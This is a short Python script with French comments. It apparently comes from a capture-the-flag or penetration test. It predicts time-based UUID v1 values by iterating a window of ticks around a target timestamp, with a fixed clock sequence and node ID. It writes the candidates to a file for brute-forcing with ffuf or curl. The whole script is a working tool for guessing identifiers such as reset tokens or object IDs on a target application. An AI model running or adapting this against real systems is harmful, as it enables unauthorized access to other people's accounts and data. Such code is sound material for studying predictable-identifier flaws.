import hashlib

def generate_uuid_v1_variants(target_date_str, clock_seq_hex, node_hex, window=500):
    from datetime import datetime
    
    # 1. Conversion de la date cible en timestamp UUID (intervalles de 100ns depuis 1582)
    # Format: 2026-02-11 03:10:14.714011
    dt = datetime.strptime(target_date_str, "%Y-%m-%d %H:%M:%S.%f")
    unix_ts = dt.timestamp()
    
    # Offset RFC 4122 : secondes entre le 15 oct 1582 et le 1er jan 1970
    offset = 12219292800
    base_uuid_ts = int((unix_ts + offset) * 10**7)
    
    print(f"[*] Timestamp de base (décimal) : {base_uuid_ts}")
    print(f"[*] Génération des variantes dans une fenêtre de +/- {window} ticks...")

    uuids = []
    
    # 2. Itération autour du timestamp pour pallier l'imprécision
    for i in range(-window, window + 1):
        ts = base_uuid_ts + i
        
        # Conversion en hexadécimal (60 bits = 15 caractères hex)
        ts_hex = f"{ts:015x}"
        
        # Découpage selon la structure UUID v1
        time_low = ts_hex[7:]        # 8 derniers caractères
        time_mid = ts_hex[3:7]       # 4 caractères du milieu
        time_hi = ts_hex[:3]         # 3 premiers caractères
        
        # Reconstruction (Le '1' avant time_hi est la version 1)
        uuid_candidate = f"{time_low}-{time_mid}-1{time_hi}-{clock_seq_hex}-{node_hex}"
        uuids.append(uuid_candidate)
        
    return uuids

# --- CONFIGURATION ---
DATE_CIBLE = "2026-02-12 03:09:46.142229"
CLOCK_SEQ = "858a"
NODE_ID = "0242ac100019"

# Exécution
resultats = generate_uuid_v1_variants(DATE_CIBLE, CLOCK_SEQ, NODE_ID, window=1000)

# Sauvegarde dans un fichier pour l'utiliser avec un outil comme ffuf ou curl
with open("uuids_cible.txt", "w") as f:
    for u in resultats:
        f.write(u + "\n")

print(f"[+] Terminé ! {len(resultats)} UUIDs générés dans 'uuids_cible.txt'")
print(f"Exemple du premier généré : {resultats[0]}")